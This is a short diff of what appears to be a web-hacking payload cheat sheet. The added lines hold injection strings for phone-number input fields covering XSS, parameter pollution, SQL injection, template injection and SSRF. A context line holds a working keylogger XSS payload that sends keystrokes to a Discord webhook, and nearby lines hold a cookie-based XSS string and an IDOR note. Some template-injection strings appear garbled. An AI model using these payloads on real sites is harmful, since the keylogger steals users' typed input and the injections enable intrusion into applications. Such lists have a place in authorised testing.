@@ -582,6 +582,30 @@ Cookie: session:VIMoamgioofjami; fehost=hossam"%2balert(1)%2b"
 
 <img src onerror='let x=!1,l="";document.onkeypress=function(a){l+=a.key,x=!0},setInterval(()=>{x&&(fetch("//discord.com/api/webhook/...",{method:"post",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:l})}),x=!1)},1e3);'>
 
+
+Payloads to try on phone number input fields by @securinti
+
+
+XSs +441134960000;phone-context=<script>alert(0)</script>
+
+Parameter pollution (1) +441134960000;phone-context=&phone-context=+442..
+
+Parameter pollution (2) +441134960000;ext=1;ext=?
+
+ SQL injection +441134960000;phone-context=' OR 1=1; --
+
+Template injection +441134960000;phone-context={{22}}[ [33]]{{77}}{% debug %} {77}{7*’7}
+
+SSRF +441134960000;phone-context=http://burocoaborator.net
+
+
+
+
+
+
+
+
+
 ------------------------------------------------------------
 IDOR :: 
   GO to my account and intercept data then change id 
